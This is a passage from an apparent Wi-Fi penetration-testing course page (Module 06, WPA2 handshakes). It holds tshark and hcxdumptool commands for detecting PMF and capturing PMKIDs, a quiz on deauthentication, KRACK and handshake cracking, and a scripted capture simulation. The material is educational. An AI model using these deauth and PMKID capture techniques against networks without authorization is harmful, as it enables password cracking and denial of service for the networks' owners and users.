            <tr><td>Capable (optional)</td><td style="color:var(--warn)">Deauth works pre-association only</td><td>Send deauth immediately on first client probe</td></tr>
            <tr><td style="color:var(--accent3)">Required (mandatory)</td><td style="color:var(--accent3)">Forged deauth rejected by client</td><td>PMKID attack (Module 12), Evil Twin (Module 09), Channel-switch flood</td></tr>
          </tbody>
        </table>
      </div>

      <div class="terminal">
        <div class="terminal-bar">
          <div class="terminal-dots"><span class="d-red"></span><span class="d-yellow"></span><span class="d-green"></span></div>
          <span class="terminal-title">Detect PMF on target AP</span>
          <button class="terminal-copy" onclick="copyTerm(this,'copy-pmf')">Copy</button>
        </div>
        <div class="terminal-body" id="copy-pmf"><span class="cmt"># Check beacon RSN capabilities for MFP flags</span>
<span class="prompt">kali@kali:~$ </span><span class="cmd">tshark <span class="flag">-r</span> capture.pcapng <span class="flag">-Y</span> <span class="str">"wlan.fc.type_subtype==8 &amp;&amp; wlan.bssid==aa:bb:cc:dd:ee:ff"</span> <span class="flag">-T</span> fields <span class="flag">-e</span> wlan_mgt.rsn.capabilities.mfpr <span class="flag">-e</span> wlan_mgt.rsn.capabilities.mfpc</span>
<span class="out">mfpr  mfpc</span>
<span class="out-ok">0     0    ← PMF disabled = deauth works</span>
<span class="out-warn">0     1    ← PMF capable = deauth works pre-assoc only</span>
<span class="out-err">1     1    ← PMF required = forged deauth rejected</span>

<span class="cmt"># If PMF required → use PMKID attack instead (no deauth needed)</span>
<span class="prompt">kali@kali:~$ </span><span class="cmd">sudo hcxdumptool <span class="flag">-i</span> wlan0mon <span class="flag">-o</span> <span class="str">pmkid.pcapng</span> <span class="flag">--enable_status=1</span></span>
<span class="cmt"># PMKID is extracted passively from Association Responses — no deauth needed</span>
<span class="cmt"># See Module 12 for full PMKID attack workflow</span></div>
      </div>
    </section>

    <!-- Section 9: Quiz -->
    <section id="quiz">
      <h2><span class="section-num">09</span> Knowledge Check</h2>

      <div class="quiz-container">
        <h3>&#127358; Module 06 Quiz &nbsp;<span style="font-size:11px;color:var(--text-dim);font-weight:400">8 questions</span></h3>

        <!-- Q1 -->
        <div class="quiz-question" id="q1">
          <div class="q-num">Question 1 of 8</div>
          <div class="q-text">Why are both the passphrase AND the SSID inputs to the WPA2 PMK derivation function?</div>
          <div class="option-list">
            <button class="option-btn" onclick="answer(this,'q1',false)">To double the key length from 128 to 256 bits</button>
            <button class="option-btn" onclick="answer(this,'q1',true)">The SSID acts as a per-network salt — making precomputed rainbow tables SSID-specific. A table built for "linksys" cannot crack "HomeNet" because the PMK values differ.</button>
            <button class="option-btn" onclick="answer(this,'q1',false)">The SSID provides entropy so the passphrase only needs 8 characters</button>
            <button class="option-btn" onclick="answer(this,'q1',false)">To comply with the 802.11i specification for SHA-256 hashing</button>
          </div>
          <div class="quiz-feedback" id="fb-q1"></div>
        </div>

        <!-- Q2 -->
        <div class="quiz-question" id="q2">
          <div class="q-num">Question 2 of 8</div>
          <div class="q-text">What are the three sub-keys that the PTK splits into, and which one is used during the cracking verification step?</div>
          <div class="option-list">
            <button class="option-btn" onclick="answer(this,'q2',false)">ANonce, SNonce, GTK — the SNonce verifies the password</button>
            <button class="option-btn" onclick="answer(this,'q2',true)">KCK (Key Confirmation Key), KEK (Key Encryption Key), TK (Temporal Key) — the KCK is used to compute the MIC that verifies the candidate password</button>
            <button class="option-btn" onclick="answer(this,'q2',false)">PMK, GTK, IVK — the PMK verifies the handshake</button>
            <button class="option-btn" onclick="answer(this,'q2',false)">TK, MIC, IV — the MIC directly contains the password hash</button>
          </div>
          <div class="quiz-feedback" id="fb-q2"></div>
        </div>

        <!-- Q3 -->
        <div class="quiz-question" id="q3">
          <div class="q-num">Question 3 of 8</div>
          <div class="q-text"><code>aircrack-ng handshake.cap</code> shows <code>WPA (0) handshake</code> for your target AP. What does this mean?</div>
          <div class="option-list">
            <button class="option-btn" onclick="answer(this,'q3',false)">The network uses WPA1 which has 0 vulnerabilities</button>
            <button class="option-btn" onclick="answer(this,'q3',true)">No EAPOL exchange was captured — the capture contains no usable handshake data. You need to recapture after ensuring the deauth was sent while airodump-ng was running.</button>
            <button class="option-btn" onclick="answer(this,'q3',false)">The capture is corrupt and needs to be re-downloaded</button>
            <button class="option-btn" onclick="answer(this,'q3',false)">The passphrase starts with "0" — aircrack-ng skipped it</button>
          </div>
          <div class="quiz-feedback" id="fb-q3"></div>
        </div>

        <!-- Q4 -->
        <div class="quiz-question" id="q4">
          <div class="q-num">Question 4 of 8</div>
          <div class="q-text">You run <code>sudo hcxdumptool -i wlan0mon -o capture.pcapng</code> and the command exits immediately with no output. What is the most likely cause?</div>
          <div class="option-list">
            <button class="option-btn" onclick="answer(this,'q4',false)">The output file already exists and cannot be overwritten</button>
            <button class="option-btn" onclick="answer(this,'q4',true)">hcxdumptool v6+ requires <code>--enable_status=1</code> flag — without it the tool exits silently</button>
            <button class="option-btn" onclick="answer(this,'q4',false)">The interface must be named "wlan0" not "wlan0mon"</button>
            <button class="option-btn" onclick="answer(this,'q4',false)">hcxdumptool requires root but you already ran it as root</button>
          </div>
          <div class="quiz-feedback" id="fb-q4"></div>
        </div>

        <!-- Q5 -->
        <div class="quiz-question" id="q5">
          <div class="q-num">Question 5 of 8</div>
          <div class="q-text">What does the KRACK attack (CVE-2017-13077) exploit and what is the result?</div>
          <div class="option-list">
            <button class="option-btn" onclick="answer(this,'q5',false)">It exploits a weak passphrase to derive the PMK from the beacon SSID</button>
            <button class="option-btn" onclick="answer(this,'q5',false)">It decrypts AES-CCMP by exploiting a mathematical weakness in the cipher itself</button>
            <button class="option-btn" onclick="answer(this,'q5',true)">It replays EAPOL Message 3 to force the client to reinstall the PTK with a reset nonce, causing CCMP nonce reuse — XORing two ciphertexts recovers plaintext</button>
            <button class="option-btn" onclick="answer(this,'q5',false)">It captures the PMK by intercepting the AP's RADIUS server response</button>
          </div>
          <div class="quiz-feedback" id="fb-q5"></div>
        </div>

        <!-- Q6 -->
        <div class="quiz-question" id="q6">
          <div class="q-num">Question 6 of 8</div>
          <div class="q-text">The target AP has PMF Required (mfpr=1, mfpc=1). Your deauth frames are being ignored. What is the best alternative capture method?</div>
          <div class="option-list">
            <button class="option-btn" onclick="answer(this,'q6',false)">Increase the deauth count to 1000 — eventually the client will disconnect</button>
            <button class="option-btn" onclick="answer(this,'q6',false)">Switch to the Cafe Latte attack — it bypasses PMF</button>
            <button class="option-btn" onclick="answer(this,'q6',true)">Use the PMKID attack (hcxdumptool) — extracts the PMKID passively from Association Responses without sending any deauth frames</button>
            <button class="option-btn" onclick="answer(this,'q6',false)">Downgrade the AP to WPA1 by sending a forged beacon</button>
          </div>
          <div class="quiz-feedback" id="fb-q6"></div>
        </div>

        <!-- Q7 -->
        <div class="quiz-question" id="q7">
          <div class="q-num">Question 7 of 8</div>
          <div class="q-text">You have two partial captures: one with EAPOL M1 only, another with EAPOL M3+M4. Can you crack this handshake, and why?</div>
          <div class="option-list">
            <button class="option-btn" onclick="answer(this,'q7',false)">No — you need all four messages in one file</button>
            <button class="option-btn" onclick="answer(this,'q7',true)">Yes — merge them with <code>mergecap</code>. M1 provides ANonce, M3 also contains ANonce and a MIC. Combined with M4's SNonce context, aircrack-ng/hashcat may succeed with M1+M3.</button>
            <button class="option-btn" onclick="answer(this,'q7',false)">No — M2 is the only message containing the SNonce needed for cracking</button>
            <button class="option-btn" onclick="answer(this,'q7',false)">Only if the AP uses TKIP, not CCMP</button>
          </div>
          <div class="quiz-feedback" id="fb-q7"></div>
        </div>

        <!-- Q8 -->
        <div class="quiz-question" id="q8">
          <div class="q-num">Question 8 of 8</div>
          <div class="q-text">What is the difference between sending <code>--deauth 0</code> and <code>--deauth 5</code> in aireplay-ng?</div>
          <div class="option-list">
            <button class="option-btn" onclick="answer(this,'q8',false)">--deauth 0 sends 0 frames (dry run); --deauth 5 sends exactly 5</button>
            <button class="option-btn" onclick="answer(this,'q8',true)">--deauth 0 sends deauth frames in an infinite loop (must Ctrl+C to stop — acts as a DoS); --deauth 5 sends exactly 5 frames and stops</button>
            <button class="option-btn" onclick="answer(this,'q8',false)">--deauth 0 targets the AP; --deauth 5 targets up to 5 clients</button>
            <button class="option-btn" onclick="answer(this,'q8',false)">--deauth 0 uses broadcast; --deauth 5 uses unicast targeting</button>
          </div>
          <div class="quiz-feedback" id="fb-q8"></div>
        </div>

        <div class="quiz-score" id="quizScore">
          <div class="score-num" id="scoreNum">0/8</div>
          <div class="score-label" id="scoreLabel"></div>
        </div>
      </div>
    </section>

    <!-- Nav -->
    <div class="nav-footer">
      <a href="../module-05-wep-cracking/" class="nav-btn prev">&#8592; Module 05: WEP Cracking</a>
      <a href="../module-07-wpa2-cracking/" class="nav-btn next">Module 07: WPA2 Cracking &#8594;</a>
    </div>
  </main>
</div>

<script>
  // Copy terminal
  function copyTerm(btn, id) {
    const el = document.getElementById(id);
    const text = el.innerText || el.textContent;
    navigator.clipboard.writeText(text.trim()).then(() => {
      btn.textContent = 'Copied!';
      btn.classList.add('copied');
      setTimeout(() => { btn.textContent = 'Copy'; btn.classList.remove('copied'); }, 2000);
    });
  }

  // ── Quiz ──────────────────────────────────────────────────────
  const TOTAL_Q = 8;
  const qAnswered = {};
  const qFeedbacks = {
    q1: {
      correct: "Correct. The SSID is a per-network salt in PBKDF2. PMK = PBKDF2(HMAC-SHA1, passphrase, SSID, 4096). Changing the SSID completely changes the PMK output for the same passphrase. A precomputed table for 'linksys' is completely useless against 'HomeNet42'.",
      wrong: "Incorrect. The SSID functions as a per-network salt in PBKDF2-SHA1. Same passphrase + different SSID = completely different PMK. This prevents precomputed rainbow tables from working across different networks."
    },
    q2: {
      correct: "Correct. PTK = KCK (128 bits) + KEK (128 bits) + TK (256 bits). The KCK is used to compute HMAC-SHA1 over the EAPOL frame body to produce the MIC. During cracking, aircrack-ng/hashcat derive a candidate KCK and verify it produces the same MIC as captured in M2.",
      wrong: "Incorrect. The PTK splits into: KCK (Key Confirmation Key) → computes MIC; KEK (Key Encryption Key) → encrypts GTK in M3; TK (Temporal Key) → AES-CCMP data encryption. Cracking verifies the KCK by recomputing the MIC."
    },
    q3: {
      correct: "Correct. 'WPA (0) handshake' means zero EAPOL exchanges were captured. Either the deauth was sent before airodump-ng started, you were on the wrong channel, or the client reconnected too fast. Start the capture FIRST, then send deauth.",
      wrong: "Incorrect. The '(N) handshake' number in aircrack-ng output is the count of captured handshakes. (0) means zero — no EAPOL exchange captured at all. Ensure airodump-ng is running and on the right channel before sending deauth."
    },
    q4: {
      correct: "Correct. hcxdumptool v6 changed the API — it requires --enable_status=1 (or 2 or 3) to show output. Without this flag, the tool checks permissions, then exits silently. Add --enable_status=1 to any hcxdumptool command.",
      wrong: "Incorrect. hcxdumptool v6+ requires --enable_status=1. Without this flag, the tool performs its initialization checks and then exits silently with no error message — it looks like it ran successfully but captured nothing."
    },
    q5: {
      correct: "Correct. KRACK forces M3 retransmission by blocking M4. The client reinstalls the PTK with PN=0. Since the same nonce feeds AES-CTR mode twice, the same keystream K is generated. C1 XOR C2 = (P1 XOR K) XOR (P2 XOR K) = P1 XOR P2 → with known plaintext, recover P2.",
      wrong: "Incorrect. KRACK (CVE-2017-13077) exploits the 4-way handshake retransmission mechanism. Replaying M3 causes PTK reinstallation with nonce reset. This causes CCMP nonce reuse — not an AES weakness, but a protocol state machine flaw."
    },
    q6: {
      correct: "Correct. With PMF Required, the client has a session PTK and uses it to verify deauth MICs — forged deauths without a valid MIC are discarded. The PMKID attack (Module 12) extracts the PMKID from the AP's Association Response — completely passive, no deauth needed.",
      wrong: "Incorrect. PMF Required means ALL deauth/disassoc frames must be MIC'd with the current PTK. Forged frames are rejected. The PMKID attack is the correct bypass — it extracts a crackable value from the AP's EAPOL RSNIE without any client interaction."
    },
    q7: {
      correct: "Correct. M1 contains the ANonce. M3 also contains the ANonce plus a verifiable MIC. After merging with mergecap, aircrack-ng can often use M1+M3 as an alternative to M1+M2. M3's MIC uses the same KCK as M2's MIC, giving aircrack-ng another verification point.",
      wrong: "Incorrect. You can attempt cracking with M1+M3. M3 contains the ANonce (same as M1 provides) and a MIC computed with the KCK. Merge the files with 'mergecap -a -F pcap -w merged.cap cap1.cap cap2.cap' and retry aircrack-ng."
    },
    q8: {
      correct: "Correct. --deauth 0 (or -0 0) sends deauth frames in an infinite loop until you press Ctrl+C — this is a continuous denial-of-service attack. --deauth 5 sends exactly 5 deauth frames and stops. In real engagements, always use a specific count (5-10) to minimize client disruption.",
      wrong: "Incorrect. The number after --deauth specifies the count. 0 = infinite loop (runs forever → DoS). 5 = sends exactly 5 frames and stops. In authorized engagements use 5-10, never 0 unless you intend to DoS the network."
    }
  };

  let qScore = 0;
  let qCount = 0;

  function answer(btn, qId, isCorrect) {
    if (qAnswered[qId]) return;
    qAnswered[qId] = true;
    qCount++;
    const qEl = document.getElementById(qId);
    const buttons = qEl.querySelectorAll('.option-btn');
    buttons.forEach(b => b.disabled = true);
    const fb = document.getElementById('fb-' + qId);
    if (isCorrect) {
      btn.classList.add('correct');
      qScore++;
      fb.textContent = '✓ ' + qFeedbacks[qId].correct;
      fb.className = 'quiz-feedback correct-fb show';
    } else {
      btn.classList.add('wrong');
      fb.textContent = '✗ ' + qFeedbacks[qId].wrong;
      fb.className = 'quiz-feedback wrong-fb show';
      buttons.forEach(b => { if (b.onclick && b.onclick.toString().includes('true')) b.classList.add('correct'); });
    }
    if (qCount === TOTAL_Q) {
      const scoreEl = document.getElementById('quizScore');
      const numEl = document.getElementById('scoreNum');
      const labelEl = document.getElementById('scoreLabel');
      numEl.textContent = qScore + '/' + TOTAL_Q;
      const pct = qScore / TOTAL_Q;
      labelEl.textContent = pct === 1 ? 'Perfect — ready for Module 07!' : pct >= 0.75 ? 'Strong — review the missed questions.' : pct >= 0.5 ? 'Getting there — re-read the key derivation and KRACK sections.' : 'Re-read the PTK derivation, hcxdumptool, and KRACK sections.';
      numEl.style.color = pct === 1 ? 'var(--accent2)' : pct >= 0.625 ? 'var(--warn)' : 'var(--accent3)';
      scoreEl.classList.add('show');
    }
  }

  // Capture simulation
  function runCaptureSim() {
    const method = document.getElementById('capMethod').value;
    const client = document.getElementById('capClient').value;
    const output = document.getElementById('simOutput');

    output.innerHTML = '<span class="sim-spinner">⟳</span> Starting capture...';

    setTimeout(() => {
      let lines = [];
      
      if (method === 'passive') {
        lines.push('<span style="color:var(--accent2)">[✓]</span> Monitor mode enabled');
        lines.push('<span style="color:var(--text-dim)">Waiting for client to authenticate...</span>');
        
        setTimeout(() => {
          lines.push('<span style="color:var(--accent2)">[+]</span> Client connected: 11:22:33:44:55:66');
          lines.push('<span style="color:var(--accent2)">[+]</span> EAPOL Message 1 captured (ANonce)');
          lines.push('<span style="color:var(--accent2)">[+]</span> EAPOL Message 2 captured (SNonce + MIC)');
          lines.push('<span style="color:var(--accent2)">[+]</span> EAPOL Message 3 captured');
          lines.push('<span style="color:var(--accent2)">[+]</span> EAPOL Message 4 captured');
          lines.push('');
          lines.push('<span style="color:var(--accent2)">KEY FOUND! WPA2 Handshake captured successfully</span>');
          output.innerHTML = lines.join('\n');
        }, 2000);
        
      } else if (method === 'deauth') {
        if (client === 'none') {
          lines.push('<span style="color:var(--warn)">[!]</span> No clients connected');
          lines.push('<span style="color:var(--text-dim)">Waiting for client...</span>');
          setTimeout(() => {
            lines.push('<span style="color:var(--accent2)">[+]</span> Client joined: 11:22:33:44:55:66');
            lines.push('<span style="color:var(--accent2)">[✓]</span> Sending deauth attack...');
            setTimeout(() => {
              lines.push('<span style="color:var(--accent2)">[+]</span> WPA2 Handshake captured!');
              output.innerHTML = lines.join('\n');
            }, 1500);
            output.innerHTML = lines.join('\n');
          }, 1500);
        } else {
          lines.push('<span style="color:var(--accent2)">[✓]</span> Sending deauth to 11:22:33:44:55:66');
          lines.push('<span style="color:var(--accent2)">[✓]</span> Client reconnected');
          lines.push('<span style="color:var(--accent2)">[+]</span> Captured 4-way handshake');
          lines.push('');
          lines.push('<span style="color:var(--accent2)">SUCCESS! Handshake saved to capture-01.cap</span>');
        }
      } else {
        lines.push('<span style="color:var(--accent2)">[✓]</span> hcxdumptool started');
        lines.push('<span style="color:var(--text-dim)">Scanning for targets...</span>');
        setTimeout(() => {
          lines.push('<span style="color:var(--accent2)">[+]</span> Found: MyNetwork (AA:BB:CC:DD:EE:FF)');
          lines.push('<span style="color:var(--accent2)">[+]</span> Sending PMKID request...');
          lines.push('<span style="color:var(--accent2)">[+]</span> Received PMKID');
          lines.push('<span style="color:var(--accent2)">[+]</span> Captured WPA2 handshake');
          lines.push('');
          lines.push('<span style="color:var(--accent2)">SUCCESS! Handshake + PMKID captured</span>');
          output.innerHTML = lines.join('\n');
        }, 1500);
      }
      
      output.innerHTML = lines.join('\n');
    }, 500);
  }
</script>
</body>
</html>
